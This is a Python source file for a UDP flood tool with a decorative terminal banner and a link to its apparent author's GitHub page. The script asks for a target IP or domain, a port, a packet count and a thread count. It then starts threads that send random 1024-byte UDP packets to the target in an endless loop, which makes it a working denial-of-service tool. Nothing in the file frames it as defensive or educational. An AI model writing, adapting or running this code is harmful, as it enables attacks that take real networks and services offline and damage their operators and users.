import os
import random
import sys
import socket
import threading
import time


os.system('cls' if os.name == 'nt' else 'clear')


NEON_PURPLE = "\033[38;2;255;0;255m"
RESET = "\033[0m"


def colored_text(text, color):
    return f"{color}{text}{RESET}"


def purple_pink_gradient(text):
    neon_purple = "\033[38;2;255;0;255m"
    RESET = "\033[0m"
    return f"{neon_purple}{text}{RESET}"


def is_valid_ipv4(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        try:
            if not 0 <= int(part) <= 255:
                return False
        except ValueError:
            return False
    return True


def run(ip_run, port_run, times_run, threads_run):
    data_run = random._urandom(1024)
    try:
        while True:
            print(purple_pink_gradient(f"[$] Packet sent to {ip_run}:{port_run}"))
            s_run = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr_run = (str(ip_run), int(port_run))
            for _ in range(times_run):
                s_run.sendto(data_run, addr_run)
            s_run.close()
    except KeyboardInterrupt:
        print(
            "\n"
            + purple_pink_gradient(" " * 50)
            + purple_pink_gradient("[!] Script terminated by user (Ctrl+C). Exiting.")
        )
        sys.exit(0)
    except Exception as e:
        sys.exit(purple_pink_gradient("[!] ") + purple_pink_gradient(str(e)) + ".")


TERMINAL_WIDTH = 120  


ascii_art = [
    "____   ____  _   _____     ________",
    "|_  _| |_  _|(_) |_   _|   |_   __  |",
    " \\ \\   / /  __    | |       | |_ \\_|",
    "  \\ \\ / /  [  |   | |   _   |  _| _",
    "    \\ ' /    | |  _| |__/ | _| |__/ |",
    "     \\_/    [___]|________||________|",
    "",
    "⠀⠀⢠⡾⠲⠶⣤⣀⣠⣤⣤⣤⡿⠛⠿⡴⠾⠛⢻⡆⠀⠀⠀",
    "⠀⣼⠁⠀⠀⠀⠉⠁⠀⢀⣿⠐⡿⣿⠿⣶⣤⣤⣷⡀⠀⠀",
    "⠀⢹⡶⠀⠀⠀⠀⠀⠀⠈⢯⣡⣿⣿⣀⣰⣿⣦⢂⡏⠀⠀",
    "⠀⢀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠹⣍⣭⣾⠁⠀⠀",
    "⠀⣀⣸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣸⣧⣤⡀",
    "⠈⠉⠹⣏⡁⠀⢸⣿⠀⠀⠀⢀⡀⠀⠀⠀⣿⠆⠀⢀⣸⣇⣀⠀",
    "⠐⠋⢻⣅⡄⢀⣀⣀⡀⠀⠯⠽⠂⢀⣀⣀⡀⠀⣤⣿⠀⠉⠀",
    "⠀⠴⠛⠙⣳⠋⠉⠉⠙⣆⠀⠀⢰⡟⠉⠈⠙⢷⠟⠈⠙⠂⠀",
    "   ⢻⣄⣠⣤⣴⠟⠛⠛⠛⢧⣤⣤⣀⡾⠀",
    "",
    ">Author: pierce                >Version: 1.0.0"
]

text = "\n".join([purple_pink_gradient(line.center(TERMINAL_WIDTH)) for line in ascii_art])
line1 = purple_pink_gradient("".center(TERMINAL_WIDTH, "-"))


info_lines = [
    ">Also visit my GitHub",
    "https://github.com/PiercedHeart-jpg"
]
info = "\n".join([purple_pink_gradient(line.center(TERMINAL_WIDTH)) for line in info_lines])

line2 = purple_pink_gradient("".center(TERMINAL_WIDTH, "-"))

print(text)
print(line1)
time.sleep(0.000000000000000000000000001)
print(info)
print(line2)

def main():
    
    while True:
        try:
            target = input(purple_pink_gradient("Enter IP or domain --> "))
            if target.strip() and (is_valid_ipv4(target) or not target.replace('.', '').isdigit()):
                break
            else:
                print(purple_pink_gradient("Invalid input. Please enter a valid IP or domain."))
        except KeyboardInterrupt:
            print(purple_pink_gradient("Script terminated by user (Ctrl+C). Exiting."))
            sys.exit(0)

    
    if not is_valid_ipv4(target):
        try:
            ip = socket.gethostbyname(target)
            print(purple_pink_gradient(f"[$] Resolved {target} to {ip}"))
        except socket.error as e:
            print(purple_pink_gradient(f"Error resolving target: {e}"))
            sys.exit(1)
    else:
        ip = target

    
    while True:
        try:
            port = int(input(purple_pink_gradient("Enter port --> ")))
            break
        except ValueError:
            print(purple_pink_gradient("Invalid input. Please enter a valid port number."))
        except KeyboardInterrupt:
            sys.exit(0)

    
    while True:
        try:
            times = int(input(purple_pink_gradient("Enter packets per connection --> ")))
            break
        except ValueError:
            print(purple_pink_gradient("Invalid input. Please enter a valid number."))
        except KeyboardInterrupt:
            sys.exit(0)

    
    while True:
        try:
            threads = int(input(purple_pink_gradient("Enter threads --> ")))
            break
        except ValueError:
            print(purple_pink_gradient("Invalid input. Please enter a valid number."))
        except KeyboardInterrupt:
            sys.exit(0)

    
    for _ in range(threads):
        thread = threading.Thread(target=run, args=(ip, port, times, threads))
        thread.start()

if __name__ == "__main__":
    main()
